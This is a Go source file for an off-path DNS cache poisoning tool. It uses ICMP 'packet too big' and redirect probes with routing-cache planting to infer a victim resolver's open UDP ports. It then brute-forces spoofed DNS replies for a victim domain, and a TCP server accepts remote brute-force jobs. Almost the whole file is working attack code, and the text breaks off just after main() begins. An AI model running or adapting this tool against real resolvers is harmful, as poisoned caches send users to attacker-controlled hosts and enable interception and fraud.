package main

import (
	"encoding/binary"
	"flag"
	"fmt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/google/gopacket/routing"
	"github.com/ugorji/go/codec"
	"log"
	"math/rand"
	"net"
	"os"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"
)

/* Input args */
var ifaceName *string
var localIP net.IP
var localIPv6Subnet *net.IPNet
var victimIP net.IP
var victimFrontIP net.IP
var victimDomain *string
var auxDomain *string
var victimAuthIP []net.IP
var gatewayMac net.HardwareAddr
var localMac net.HardwareAddr
var collidingIPs = make([][]net.IP, 0)
var collidingIPs2 = make([][]net.IP, 0)
var groupSize *int
var groupGap *uint
var startPort *uint
var endPort *uint
var dnsPrivacyMode *bool
var enhancedRefreshPercentage *uint
var publicPortMode *bool
var forwarderInjectMode *bool
var redirectAttackMode *bool
var floodOnlyMode *bool
var remoteBF *bool
var remoteQuery *bool
var testMode *bool
var useLocalIP *bool
var enableBF *bool
var recvTimes uint

var packetSendingGap *uint
var verificationGap *uint
var plantingGap *uint
var plantingFinishGap *uint
var dnsBFTimeGap *uint
var dnsBFFinishTimeGap *uint
var bsStateDuration *uint
var jitterProtectionDuration *uint

/* Inner variables */
var h *pcap.Handle
var eth *layers.Ethernet
var dnsQueryName string
var gotReply bool
var replyReason int
var backendResolvers = make([]*BackendResolver, 0)
var pcapChannel = make(chan []byte, 99999)
var bsTimeStamp time.Time
var bsStartPort uint16
var lastReplantTime time.Time
var attackStartTime time.Time

/* can be configured if necessary */
var repeatTimes = 1

/* Const configurations */
const BUCKET_DEPTH = 6   /*6 for ipv4, 5 for ipv6*/
const IPICMPHDRLEN = 28  /*48 for ipv6, 28 for ipv4*/
const GARBAGE_EXTRA = 10 /*How many do we want to exceed MTU?*/
const NS_NUM = 1
const MIN_MTU = 700 /*1280 for ipv6*/

/*port map*/
var portMap = make(map[layers.UDPPort]bool)
var currentPort layers.UDPPort = 0
var hitTimes = 0
var missTimes = 0

type BackendResolver struct {
	resolverBackendIP net.IP
	alwaysOpenPorts   []bool //= make([]bool, 65536)
	networkXmitLock   *sync.Mutex
	nameServers       []*NameServer
	redirectNewGW     net.IP
	redirectOldGW     net.IP
}

type NameServer struct {
	nsIP          net.IP
	collidingIPs  []net.IP
	collidingIPs2 []net.IP
	/* routing cache planting args */
	fastPlantMode        bool // Determine if we reverse the order everytime
	nextTimeReverseOrder bool
	checkingFirstLocalIP bool
	mtu                  uint16
	garbage              []byte
	/* Group Related */
	groups             [][]uint16 // = make([][]uint16, 65536)
	groupIDCounter     uint16     // = 3
	groupIDCounterLock *sync.Mutex
	groupSendTime      []time.Time // = make([]time.Time, 65536)
	/* Channel Related */
	probeChannel              chan uint16 //= make(chan uint16, 655)
	priorityProbeChannel      chan uint16 //= make(chan uint16, 655)
	priorityProbeGroupNumLock *sync.Mutex
	priorityProbeGroupNum     []uint16
	bruteForceBuffer          chan uint16
	receivedPortidChannel     chan uint16 // only used in redirect mode
	/* Sync */
	readyToBegin bool
}

func dnsRequestSender(timeout uint, srcIP net.IP) {
	for {
		dnsQueryName = strconv.Itoa(rand.Int()) + "." + *victimDomain
		gotReply = false
		sendDNSRequest(uint16(rand.Uint32()), dnsQueryName, srcIP, victimFrontIP)
		retryTimes := timeout / 500
		for {
			if !gotReply {
				time.Sleep(500 * time.Millisecond)
				retryTimes--
				if retryTimes == 0 {
					break
				}
			} else {
				fmt.Println("Got reply in", timeout-retryTimes*500, "ms, code=", replyReason)
				break
			}
		}
	}
}

func cachePlanter(r *BackendResolver, n *NameServer, force bool, randomMode bool) {
	//fmt.Println("Plant begin...", force)
	v6 := r.resolverBackendIP.To4() == nil
	probingICMPLayer0, probingICMPLayer1 := GetICMPPkt2BigLayer(n.mtu, v6)
	probingPingReplyLayer0, probingPingReplyLayer1 := GetICMPPingReplyLayer(0, 0, v6)
	probingPingLayer0, probingPingLayer1 := GetICMPPingLayer(2, 2, v6)
	/***************
	TODO: change to 53
	****************/
	probingUDP53Layer := GetUDPLayer(53, 40000)
	var gap uint = 0
	if !n.fastPlantMode {
		gap = 5000 + *plantingGap /* Jiffies */
	} else {
		gap = *plantingGap
	}
	//enhancedMode := len(n.collidingIPs2) != 0 && rand.Uint32()%100 < uint32(*enhancedRefreshPercentage)
	if !force {
		n.nextTimeReverseOrder = true
		n.checkingFirstLocalIP = false
		for {
			for randomMode {
				if rand.Uint32()%100 >= uint32(*enhancedRefreshPercentage) {
					time.Sleep(time.Second)
				} else {
					//fmt.Println("random replanting")
					break
				}
			}
			r.networkXmitLock.Lock()
			if *plantingFinishGap != 0 {
				time.Sleep(time.Duration(*plantingFinishGap) * time.Microsecond)
			}
			if len(n.collidingIPs2) != 0 {
				for _, cIP := range n.collidingIPs2 {
					probingIPLayer := GetIPLayer(localIP, r.resolverBackendIP, false, 2, layers.IPProtocolICMPv6)
					if !*useLocalIP {
						probingIPLayer = GetIPLayer(cIP, r.resolverBackendIP, false, 2, layers.IPProtocolICMPv6)
					}
					probingInnerIPLayer := GetIPLayer(r.resolverBackendIP, cIP, false, 0, layers.IPProtocolICMPv6)
					if *redirectAttackMode {
						probingIPLayer = GetIPLayerWithTTL(r.redirectOldGW, r.resolverBackendIP, false, 2, layers.IPProtocolICMPv6, 255)
						probingICMPLayer0, probingICMPLayer1 = GetICMPRedirectLayer(r.redirectNewGW, cIP, v6)
						probingInnerIPLayer = GetIPLayer(r.resolverBackendIP, cIP, false, 0, layers.IPProtocolUDP)
						for i := 0; i < 3; i++ {
							XmitICMP(h, eth, probingIPLayer, probingICMPLayer0, probingICMPLayer1, probingInnerIPLayer, &probingUDP53Layer, nil, nil, gap)
						}
					} else {
						XmitICMP(h, eth, probingIPLayer, probingICMPLayer0, probingICMPLayer1, probingInnerIPLayer, probingPingReplyLayer0, probingPingReplyLayer1, nil, gap)
					}
				}
				/* This would replant the cache, so adjust the sequence */
				n.nextTimeReverseOrder = true
				n.checkingFirstLocalIP = false
				/* To wait for a jiffies, pay attention not to use too much random planting which will drain the performance */
				time.Sleep(5 * time.Millisecond)
			}

			for c, cIP := range n.collidingIPs {
				probingIPLayer := GetIPLayer(localIP, r.resolverBackendIP, false, 2, layers.IPProtocolICMPv6)
				if !*useLocalIP {
					probingIPLayer = GetIPLayer(cIP, r.resolverBackendIP, false, 2, layers.IPProtocolICMPv6)
				}
				probingInnerIPLayer := GetIPLayer(r.resolverBackendIP, cIP, false, 0, layers.IPProtocolICMPv6)
				if *redirectAttackMode {
					probingIPLayer = GetIPLayerWithTTL(r.redirectOldGW, r.resolverBackendIP, false, 2, layers.IPProtocolICMPv6, 255)
					probingICMPLayer0, probingICMPLayer1 = GetICMPRedirectLayer(r.redirectNewGW, cIP, v6)
					probingInnerIPLayer = GetIPLayer(r.resolverBackendIP, cIP, false, 0, layers.IPProtocolUDP)
					for i := 0; i < 3; i++ {
						XmitICMP(h, eth, probingIPLayer, probingICMPLayer0, probingICMPLayer1, probingInnerIPLayer, &probingUDP53Layer, nil, nil, gap)
					}
				} else {
					XmitICMP(h, eth, probingIPLayer, probingICMPLayer0, probingICMPLayer1, probingInnerIPLayer, probingPingReplyLayer0, probingPingReplyLayer1, nil, gap)
					if c == 0 && !v6 {
						/*static bool rt_bind_exception may change the ts, we assume the first colliding IP is used to send the verification*/
						probingIPLayer1 := GetIPLayer(cIP, r.resolverBackendIP, false, 2, layers.IPProtocolICMPv6)
						XmitICMP(h, eth, probingIPLayer1, probingPingLayer0, probingPingLayer1, nil, nil, nil, nil, gap)
					}
				}
			}
			/* let the planting nodes go through */
			if *plantingFinishGap != 0 {
				time.Sleep(time.Duration(*plantingFinishGap) * time.Microsecond)
			}
			r.networkXmitLock.Unlock()
			lastReplantTime = time.Now()
			n.readyToBegin = true
			if !randomMode {
				for {
					if time.Now().Sub(lastReplantTime) > 29*time.Second {
						fmt.Println("30s replanter kicks in.")
						break
					}
					time.Sleep(time.Second)
				}
			}
		}
	} else {
		r.networkXmitLock.Lock()
		if *plantingFinishGap != 0 {
			time.Sleep(time.Duration(*plantingFinishGap) * time.Microsecond)
		}
		if n.fastPlantMode {
			// TODO: uncomment this in the real cases. In the test there's already a huge gap (9ms)
			/*
				if c == 1 && !v6 {
					XmitICMP(h, eth, probingIPLayer, probingPingLayer0, probingPingLayer1, nil, nil, nil, nil, gap)
				}
			*/
			time.Sleep(4 * time.Millisecond)
			if n.nextTimeReverseOrder {
				for i := BUCKET_DEPTH - 1; i >= 0; i-- {
					probingIPLayer := GetIPLayer(localIP, r.resolverBackendIP, false, 2, layers.IPProtocolICMPv6)
					if !*useLocalIP {
						probingIPLayer = GetIPLayer(n.collidingIPs[i], r.resolverBackendIP, false, 2, layers.IPProtocolICMPv6)
					}
					probingInnerIPLayer := GetIPLayer(r.resolverBackendIP, n.collidingIPs[i], false, 0, layers.IPProtocolICMPv6)
					if *redirectAttackMode {
						probingIPLayer = GetIPLayerWithTTL(r.redirectOldGW, r.resolverBackendIP, false, 2, layers.IPProtocolICMPv6, 255)
						probingICMPLayer0, probingICMPLayer1 = GetICMPRedirectLayer(r.redirectNewGW, n.collidingIPs[i], v6)
						probingInnerIPLayer = GetIPLayer(r.resolverBackendIP, n.collidingIPs[i], false, 0, layers.IPProtocolUDP)
						XmitICMP(h, eth, probingIPLayer, probingICMPLayer0, probingICMPLayer1, probingInnerIPLayer, &probingUDP53Layer, nil, nil, gap)
					} else {
						XmitICMP(h, eth, probingIPLayer, probingICMPLayer0, probingICMPLayer1, probingInnerIPLayer, probingPingReplyLayer0, probingPingReplyLayer1, nil, gap)
					}
				}
				n.nextTimeReverseOrder = false
				n.checkingFirstLocalIP = true
			} else {
				for i := 0; i < BUCKET_DEPTH; i++ {
					probingIPLayer := GetIPLayer(localIP, r.resolverBackendIP, false, 2, layers.IPProtocolICMPv6)
					if !*useLocalIP {
						probingIPLayer = GetIPLayer(n.collidingIPs[i], r.resolverBackendIP, false, 2, layers.IPProtocolICMPv6)
					}
					probingInnerIPLayer := GetIPLayer(r.resolverBackendIP, n.collidingIPs[i], false, 0, layers.IPProtocolICMPv6)
					if *redirectAttackMode {
						probingIPLayer = GetIPLayerWithTTL(r.redirectOldGW, r.resolverBackendIP, false, 2, layers.IPProtocolICMPv6, 255)
						probingICMPLayer0, probingICMPLayer1 = GetICMPRedirectLayer(r.redirectNewGW, n.collidingIPs[i], v6)
						probingInnerIPLayer = GetIPLayer(r.resolverBackendIP, n.collidingIPs[i], false, 0, layers.IPProtocolUDP)
						XmitICMP(h, eth, probingIPLayer, probingICMPLayer0, probingICMPLayer1, probingInnerIPLayer, &probingUDP53Layer, nil, nil, gap)
					} else {
						XmitICMP(h, eth, probingIPLayer, probingICMPLayer0, probingICMPLayer1, probingInnerIPLayer, probingPingReplyLayer0, probingPingReplyLayer1, nil, gap)
					}
				}
				n.nextTimeReverseOrder = true
				n.checkingFirstLocalIP = false
			}
			//time.Sleep(4 * time.Millisecond)
		} else {
			for i := 0; i < BUCKET_DEPTH; i++ {
				probingIPLayer := GetIPLayer(localIP, r.resolverBackendIP, false, 2, layers.IPProtocolICMPv6)
				if !*useLocalIP {
					probingIPLayer = GetIPLayer(n.collidingIPs[i], r.resolverBackendIP, false, 2, layers.IPProtocolICMPv6)
				}
				probingInnerIPLayer := GetIPLayer(r.resolverBackendIP, n.collidingIPs[i], false, 0, layers.IPProtocolICMPv6)
				if *redirectAttackMode {
					probingIPLayer = GetIPLayerWithTTL(r.redirectOldGW, r.resolverBackendIP, false, 2, layers.IPProtocolICMPv6, 255)
					probingICMPLayer0, probingICMPLayer1 = GetICMPRedirectLayer(r.redirectNewGW, n.collidingIPs[i], v6)
					probingInnerIPLayer = GetIPLayer(r.resolverBackendIP, n.collidingIPs[i], false, 0, layers.IPProtocolUDP)
					XmitICMP(h, eth, probingIPLayer, probingICMPLayer0, probingICMPLayer1, probingInnerIPLayer, &probingUDP53Layer, nil, nil, gap)
				} else {
					XmitICMP(h, eth, probingIPLayer, probingICMPLayer0, probingICMPLayer1, probingInnerIPLayer, probingPingReplyLayer0, probingPingReplyLayer1, nil, gap)
					if i == 0 && !v6 {
						/*static bool rt_bind_exception may change the ts, we assume the first colliding IP is used to send the verification*/
						probingIPLayer1 := GetIPLayer(n.collidingIPs[i], r.resolverBackendIP, false, 2, layers.IPProtocolICMPv6)
						XmitICMP(h, eth, probingIPLayer1, probingPingLayer0, probingPingLayer1, nil, nil, nil, nil, gap)
					}
				}
			}
		}
		/* let the planting nodes go through */
		if *plantingFinishGap != 0 {
			time.Sleep(time.Duration(*plantingFinishGap) * time.Microsecond)
		}
		r.networkXmitLock.Unlock()
	}
	//fmt.Println("Plant end")
}

func recevingWorker() {
	for {
		data := <-pcapChannel
		packet := gopacket.NewPacket(data, layers.LayerTypeEthernet, gopacket.DecodeOptions{
			Lazy:                     true,
			NoCopy:                   true,
			SkipDecodeRecovery:       false,
			DecodeStreamsAsDatagrams: false,
		})
		srcIP, dstIP, fl, pktlen, nh := ExtractIPPacket(&packet)
		/***************************************/
		// to remove, pretend we are off path
		//if !SendToUs(&packet, eth.SrcMAC) {
		//	continue
		//}
		/**************************************/
		sendByUs := SendByUs(&packet, eth.SrcMAC)
		switch nh {
		case layers.IPProtocolUDP:
			/* TODO: here we assumes the front IP and back IP are the same, but always leave victimIP as front end */
			/* Fixed by changing to victimFrontIP */
			if !sendByUs && CompareIPAddr(srcIP, victimFrontIP, 0) == 0 && fl != 2 {
				_, _, dns := ExtractDNSPacket(&packet)
				if dns != nil && dns.Questions != nil && len(dns.Questions) != 0 {
					if string(dns.Questions[0].Name) == dnsQueryName && dns.QR == true {
						gotReply = true
						replyReason = int(dns.ResponseCode)
					}
					/* TODO: change the SOA name accordingly */
					if dns.QR == true && dns.Authorities != nil && len(dns.Authorities) != 0 && dns.ResponseCode == layers.DNSResponseCodeNXDomain && string(dns.Questions[0].Name) == dnsQueryName && string(dns.Authorities[0].Name) == *victimDomain && string(dns.Authorities[0].SOA.MName) == "www.SAMPLE.com" {
						fmt.Println("Success!!")
						fmt.Println("Finish attack @", time.Now())
						fmt.Println("Duration:", time.Now().Sub(attackStartTime))
						os.Exit(0)
					} else if dns.QR == true && string(dns.Questions[0].Name) == dnsQueryName && dns.ResponseCode == layers.DNSResponseCodeNoErr {
						for _, record := range dns.Answers {
							if record.Type == layers.DNSTypeA {
								fmt.Println("Success2!!")
								fmt.Println("Finish attack @", time.Now())
								fmt.Println("Duration:", time.Now().Sub(attackStartTime))
								fmt.Println("BF total duration:", bfTotalTime)
								fmt.Println("BF times:", bfTimes)
								os.Exit(0)
							}
						}
					}
				}
			}
			if !sendByUs && CompareIPAddr(srcIP, victimIP, 0) == 0 && fl != 2 {
				_, _, dns := ExtractDNSPacket(&packet)
				if dns.QR == false && *floodOnlyMode && strings.Contains(string(dns.Questions[0].Name), *victimDomain) {
					sport, _, _ := ExtractUDPPacket(&packet)
					//dnsBruteForce(dstIP, srcIP, uint16(sport), *dnsBFTimeGap, *dnsBFFinishTimeGap, *auxDomain, *victimDomain, string(dns.Questions[0].Name), *forwarderInjectMode)
					normalReturn(dstIP, srcIP, sport, dns.ID, dns.Questions[0], *auxDomain, *victimDomain)
				}
			}
			if !sendByUs && *testMode {
				sport, _, _ := ExtractUDPPacket(&packet)
				if sport != 0 {
					_, _, dns := ExtractDNSPacket(&packet)
					if dns != nil && dns.Questions != nil && len(dns.Questions) != 0 && dns.QR == false {
						r := getBackendResolver(srcIP)
						if r == nil {
							normalReturn(dstIP, srcIP, sport, dns.ID, dns.Questions[0], "", "")
							break
						} else {
							// pretend we are attacking
							// TODO: here we assumes only one name server
							fmt.Println("recv query from", srcIP, ":", sport, "id=", dns.ID)
							portMap[sport] = true
							currentPort = sport
							recvTimes++
							if recvTimes%2 != 0 {
								continue
							}
							n := r.nameServers[0]
							for i := 0; i < 100; i++ {
								id := allocateGroupID(n)
								// TODO: we assumes the group size is 1
								n.groups[id] = make([]uint16, 1)
								n.groups[id][0] = uint16(sport) - uint16(50) + uint16(i)
								n.probeChannel <- id
							}
							dnsBruteForce(dstIP, srcIP, uint16(sport), *dnsBFTimeGap, *dnsBFFinishTimeGap, *auxDomain, *victimDomain, string(dns.Questions[0].Name), *forwarderInjectMode)
						}
					}
				}
			}
			break
			// IPv4 also goes here
		case layers.IPProtocolIPv6Fragment:
			if guessSeedMode && !sendByUs {
				_, offset, _, nextHeader, payload := ExtractFragment(&packet)
				innerPkt := gopacket.NewPacket(payload, nextHeader, gopacket.NoCopy)
				_type, _, _, _, _ := ExtractICMPPacket(&innerPkt)
				if _type == layers.ICMPv6TypeEchoReply || _type == layers.ICMPv4TypeEchoReply {
					if CompareIPAddr(victimIP, srcIP, 0) == 0 && offset == 0 {
						if !guessSeedMacMode {
							ipNoFragMap[dstIP.String()] = false
						} else {
							srcMac, _ := ExtractMacPacket(&packet)
							ip, ok := macIPMap[srcMac.String()]
							if ok {
								ipNoFragMap[ip.String()] = false
							}
						}
					}
				}
			}
			if !sendByUs && *publicPortMode {
				r := getBackendResolver(srcIP)
				if r == nil {
					break
				}
				// check the MTU
				_, offset, _, nextHeader, payload := ExtractFragment(&packet)
				n := r.nameServers[0]
				if offset == 0 {
					if pktlen <= n.mtu {
						fmt.Println(pktlen, n.mtu)
						// Port hit
						if pktlen-1 >= MIN_MTU {
							if nextHeader == layers.IPProtocolICMPv6 || nextHeader == layers.IPProtocolICMPv4 {
								innerPkt := gopacket.NewPacket(payload, nextHeader, gopacket.NoCopy)
								_type, _, _id, _, _ := ExtractICMPPacket(&innerPkt)
								if _type == layers.ICMPv6TypeEchoReply || _type == layers.ICMPv4TypeEchoReply {
									binarySearch(r, n, _id)
								}
							}
						} else {

						}
					}
				}
			}
			// wrong guess
			break
		case layers.IPProtocolICMPv4:
			fallthrough
		case layers.IPProtocolICMPv6:
			if guessSeedMode && !sendByUs {
				_type, _, _, _, _ := ExtractICMPPacket(&packet)
				srcMac, _ := ExtractMacPacket(&packet)
				if _type == layers.ICMPv6TypeEchoReply || _type == layers.ICMPv4TypeEchoReply {
					if CompareIPAddr(victimIP, srcIP, 0) == 0 {
						//fmt.Println("No frag1:",_type,srcMac)
						if !guessSeedMacMode {
							ipNoFragMap[dstIP.String()] = true
							//fmt.Println("No frag-1:",_type,srcMac)
						} else {
							ip, ok := macIPMap[srcMac.String()]
							//fmt.Println("No frag2:",_type,srcMac,ip)
							if ok {
								ipNoFragMap[ip.String()] = true
								//fmt.Println("No frag:", ip)
							}
						}
					}
				}
			}
			if !sendByUs && !*publicPortMode {
				r := getBackendResolver(srcIP)
				if r == nil {
					break
				}
				n := getNS(dstIP, r)
				if n == nil {
					break
				}
				if *groupSize != 1 {
					cachePlanter(r, n, true, false)
				}
				_type, _, _id, _, _ := ExtractICMPPacket(&packet)
				if _type == layers.ICMPv6TypeEchoReply || _type == layers.ICMPv4TypeEchoReply {
					binarySearch(r, n, _id)
				}
			}
			break
		default:
			break
		}
	}
}

func recevingThread() {
	for {
		data, _, err := h.ReadPacketData()
		if err == pcap.NextErrorTimeoutExpired {
			continue
		} else if err != nil {
			log.Printf("error reading packet: %v", err)
			if guessSeedMacMode {
				break
			}
			continue
		}
		pcapChannel <- data
	}
}

func bruteForcer(r *BackendResolver, n *NameServer) {
	for {
		ports := make([]uint16, 0)
		ports = append(ports, <-n.bruteForceBuffer)
		// enter waiting mode
		r.networkXmitLock.Lock()
		time.Sleep(time.Duration(*jitterProtectionDuration) * time.Millisecond)
		for len(n.bruteForceBuffer) > 0 {
			ports = append(ports, <-n.bruteForceBuffer)
		}
		// sort
		// TODO: BUG here, no wrap around is considered
		sort.Slice(ports, func(i, j int) bool {
			return ports[i] < ports[j]
		})
		questionName := ""
		if *dnsPrivacyMode && !*publicPortMode {
			questionName = "_." + *victimDomain
		} else {
			questionName = dnsQueryName
		}
		fmt.Println("BF", ports[0])
		dnsBruteForce(n.nsIP, r.resolverBackendIP, ports[0], *dnsBFTimeGap, *dnsBFFinishTimeGap, *auxDomain, *victimDomain, questionName, *forwarderInjectMode)
		r.networkXmitLock.Unlock()
		if !*publicPortMode {
			cachePlanter(r, n, true, false)
		} else {
			/* TODO: BUG here, we only assumes only one NS of the forwarder */
			if *publicPortMode && n.mtu == MIN_MTU {
				/* TODO: we can periodically check if the previous MTU still exists and we may increase it if it doesn't*/
				fmt.Println("MTU exhausted, consider pause for 10min or wait for the cache to expire and rerun.")
				os.Exit(1)
			} else {
				n.mtu -= 8
			}
		}
		n.bruteForceBuffer = make(chan uint16, 65536)
		r.alwaysOpenPorts[ports[0]] = true

	}
}

/* Maybe we can make the BF multi-threaded? */
func binarySearch(r *BackendResolver, n *NameServer, oldid uint16) {
	if oldid < 3 {
		return
	}
	group := n.groups[oldid]
	groupLen := len(group)

	if groupLen == 1 {
		//brute force
		//fmt.Println("Open Port:", group[0])
		questionName := ""
		if *dnsPrivacyMode && !*publicPortMode {
			questionName = "_." + *victimDomain
		} else {
			questionName = dnsQueryName
		}
		if !*publicPortMode {
			if *groupSize > 1 {
				//fmt.Println("Brute Force:", group[0])
				r.networkXmitLock.Lock()
				dnsBruteForce(n.nsIP, r.resolverBackendIP, group[0], *dnsBFTimeGap, *dnsBFFinishTimeGap, *auxDomain, *victimDomain, questionName, *forwarderInjectMode)
				r.networkXmitLock.Unlock()
				r.alwaysOpenPorts[group[0]] = true
			} else {
				n.bruteForceBuffer <- group[0]
				//fmt.Println("Append open port", group[0], "id=", oldid)
			}
		} else {
			for _, ns := range r.nameServers {
				if *groupSize > 1 {
					//fmt.Println("Brute Force:", group[0])
					r.networkXmitLock.Lock()
					dnsBruteForce(ns.nsIP, r.resolverBackendIP, group[0], *dnsBFTimeGap, *dnsBFFinishTimeGap, *auxDomain, *victimDomain, questionName, *forwarderInjectMode)
					r.networkXmitLock.Unlock()
					r.alwaysOpenPorts[group[0]] = true
				} else {
					ns.bruteForceBuffer <- group[0]
				}
			}
		}

		//cachePlanter(r, n, true)

	} else if groupLen > 1 {
		/* No use currently */
		var repeatTimes1 int
		if repeatTimes > 1 {
			repeatTimes1 = repeatTimes + 1
		} else {
			repeatTimes1 = 1
		}
		for j := 0; j < repeatTimes1; j++ {
			//left
			id := allocateGroupID(n)
			n.groups[id] = make([]uint16, groupLen/2)
			copy(n.groups[id], group[0:groupLen/2])
			fmt.Println(r.resolverBackendIP, "bsl", n.groups[id][0], "+", len(n.groups[id]), "old id=", oldid, "id=", id)
			/*
				n.priorityProbeGroupNumLock.Lock()
				n.priorityProbeGroupNum = append(n.priorityProbeGroupNum, id)
				n.priorityProbeGroupNumLock.Unlock()
			*/
			n.priorityProbeChannel <- id

			//right
			id = allocateGroupID(n)
			n.groups[id] = make([]uint16, groupLen-groupLen/2)
			copy(n.groups[id], group[groupLen/2:groupLen])
			fmt.Println(r.resolverBackendIP, "bsr", n.groups[id][0], "+", len(n.groups[id]), "old id=", oldid, "id=", id)
			/*
				n.priorityProbeGroupNumLock.Lock()
				n.priorityProbeGroupNum = append(n.priorityProbeGroupNum, id)
				n.priorityProbeGroupNumLock.Unlock()
			*/
			n.priorityProbeChannel <- id
		}
	} else {
		//cachePlanter(r, n, true)
		fmt.Println(r.resolverBackendIP, "bug: groupLen <= 0, id=", oldid)
	}
}

func probeSender(r *BackendResolver, n *NameServer) {
	v6 := r.resolverBackendIP.To4() == nil
	var probingICMPLayer0, probingICMPLayer1 gopacket.SerializableLayer
	if !*redirectAttackMode {
		probingICMPLayer0, probingICMPLayer1 = GetICMPPkt2BigLayer(n.mtu, v6)
	} else {
		probingICMPLayer0, probingICMPLayer1 = GetICMPRedirectLayer(r.redirectNewGW, n.nsIP, v6)
	}
	var probingInnerIPLayer gopacket.SerializableLayer
	if !*publicPortMode {
		probingInnerIPLayer = GetIPLayer(r.resolverBackendIP, n.nsIP, false, 0, layers.IPProtocolUDP)
	} else {
		probingInnerIPLayer = GetIPLayer(r.resolverBackendIP, localIP, false, 0, layers.IPProtocolUDP)
	}
	probingUDPLayer := GetUDPLayer(0, 53)
	if !*publicPortMode {
		for {
			if n.readyToBegin {
				break
			}
			time.Sleep(time.Millisecond)
		}
	}
	bsTimeStamp = time.Now().Add(-time.Duration(*bsStateDuration) * time.Millisecond)
	for {
		var id uint16
		bsMode := false
		if time.Now().Sub(bsTimeStamp) < time.Duration(*bsStateDuration)*time.Millisecond {
			bsMode = true
		}
		if len(n.priorityProbeChannel) != 0 {
			id = <-n.priorityProbeChannel
			if bsMode {
				if calculatePortDistance(n.groups[id][0], bsStartPort) >= uint16(*groupSize) {
					continue
				}
				bsTimeStamp = time.Now()
			} else {
				//cachePlanter(r, n, true)
				bsTimeStamp = time.Now()
				bsStartPort = n.groups[id][0]
				fmt.Println("BS Mode for Port", n.groups[id][0])
				bsMode = true
			}
		} else {
			if bsMode {
				time.Sleep(time.Microsecond)
				continue
			} else {
				select {
				case id = <-n.probeChannel:
					break
				default:
					time.Sleep(time.Microsecond)
				}
			}
		}

		/* send probes */
		if id == 0 {
			continue
		}
		ports := n.groups[id]
		var probingIPLayer gopacket.SerializableLayer
		if !*redirectAttackMode {
			probingIPLayer = GetIPLayer(localIP, r.resolverBackendIP, false, uint32(id), layers.IPProtocolICMPv6)
			if !*useLocalIP {
				probingIPLayer = GetIPLayer(n.nsIP, r.resolverBackendIP, false, uint32(id), layers.IPProtocolICMPv6)
			}
		} else {
			probingIPLayer = GetIPLayerWithTTL(r.redirectOldGW, r.resolverBackendIP, false, uint32(id), layers.IPProtocolICMPv6, 255)
		}
		if *publicPortMode {
			probingICMPLayer0, probingICMPLayer1 = GetICMPPkt2BigLayer(n.mtu, v6)
		}
		r.networkXmitLock.Lock()
		for _, port := range ports {
			probingUDPLayer.SrcPort = layers.UDPPort(port)
			XmitICMP(h, eth, probingIPLayer, probingICMPLayer0, probingICMPLayer1, probingInnerIPLayer, &probingUDPLayer, nil, nil, *packetSendingGap)
		}
		if *verificationGap != 0 {
			time.Sleep(time.Duration(*verificationGap) * time.Microsecond)
		}

		/* verification */
		var verificationIPLayer gopacket.SerializableLayer
		verificationPingLayer0, verificationPingLayer1 := GetICMPPingLayer(id, id, v6)
		if !*publicPortMode {
			if !n.fastPlantMode || n.checkingFirstLocalIP {
				/* TODO: we msut control n.collidingIPs[0] */
				verificationIPLayer = GetIPLayer(n.collidingIPs[0], r.resolverBackendIP, false, uint32(id), layers.IPProtocolICMPv6)
			} else {
				verificationIPLayer = GetIPLayer(n.collidingIPs[BUCKET_DEPTH-1], r.resolverBackendIP, false, uint32(id), layers.IPProtocolICMPv6)
			}
		} else {
			verificationIPLayer = GetIPLayer(localIP, r.resolverBackendIP, false, uint32(id), layers.IPProtocolICMPv6)
		}
		n.groupSendTime[id] = time.Now()
		if !*redirectAttackMode {
			XmitICMP(h, eth, verificationIPLayer, verificationPingLayer0, verificationPingLayer1, nil, nil, nil, n.garbage, 0)
			/* test */
			//checkCacheStatus(r, n)
		} else {
			XmitICMP(h, eth, verificationIPLayer, verificationPingLayer0, verificationPingLayer1, nil, nil, nil, nil, 0)
		}

		r.networkXmitLock.Unlock()
		if bsMode {
			//cachePlanter(r, n, true)
		}
		if *groupGap != 0 {
			time.Sleep(time.Duration(*groupGap) * time.Microsecond)
		}
	}
}

type DnsQuery struct {
	DnsQueryName string
	FrontIP      net.IP
	VictimDomain string
}

type BfInfo struct {
	NsIP               net.IP
	BackendIP          net.IP
	Port               uint16
	DnsBFTimeGap       uint
	DnsBFFinishTimeGap uint
	AuxDomain          string
	VictimDomain       string
	QuestionName       string
	PublicPortMode     bool
}

type RemoteInfo struct {
	Dq *DnsQuery
	Bf *BfInfo
}

var bfCount byte = 0

func serverWorker(conn net.Conn, srcIP net.IP) {
	for {
		defer conn.Close()
		/*data len(2 bytes)+data*/
		/*get data len*/
		temp := make([]byte, 2)
		n, err := conn.Read(temp)
		if err != nil {
			fmt.Println("read failed1:", err)
			return // restart TCP
		}
		if n == 1 {
			tmp := make([]byte, 1)
			_, err = conn.Read(tmp)
			if err != nil {
				fmt.Println("read failed2:", err)
				return // restart TCP
			}
			temp[1] = tmp[0]
		}
		datalen := binary.BigEndian.Uint16(temp)
		/*read data*/
		remainLen := datalen
		data := make([]byte, 0)
		for remainLen > 0 {
			temp = make([]byte, remainLen)
			n, err = conn.Read(temp)
			if err != nil {
				fmt.Println("read failed2:", err)
				return // restart TCP
			}
			data = append(data, temp...)
			remainLen -= uint16(n)
		}
		/*deserialize*/
		handle := new(codec.BincHandle)
		dec := codec.NewDecoderBytes(data, handle)
		var info RemoteInfo
		err = dec.Decode(&info)
		if err != nil {
			fmt.Println("decode fail", err)
		}
		/*BF*/
		if info.Dq != nil {
			// TODO: incomplete here. The server can't notify the client (1)query returned early and (2)successful  attack
			victimFrontIP = info.Dq.FrontIP
			dnsQueryName = info.Dq.DnsQueryName
			*victimDomain = info.Dq.VictimDomain
			sendDNSRequest(uint16(rand.Uint32()), info.Dq.DnsQueryName, srcIP, info.Dq.FrontIP)
		}
		if info.Bf != nil {
			dnsBruteForce(srcIP, info.Bf.BackendIP, info.Bf.Port, info.Bf.DnsBFTimeGap, info.Bf.DnsBFFinishTimeGap, info.Bf.AuxDomain, info.Bf.VictimDomain, info.Bf.QuestionName, *forwarderInjectMode)
		}
		bfCount++
		_, err = conn.Write([]byte{bfCount})
		if err != nil {
			fmt.Println("write failed:", err)
		}
	}
}

func serverRoutine(listensock net.Listener, srcIP net.IP) {
	for {
		conn, err := listensock.Accept()
		if err != nil {
			fmt.Println("accept failed:", err)
			continue
		}
		serverWorker(conn, srcIP)
	}
}

func main() {
	rand.Seed(time.Now().Unix())
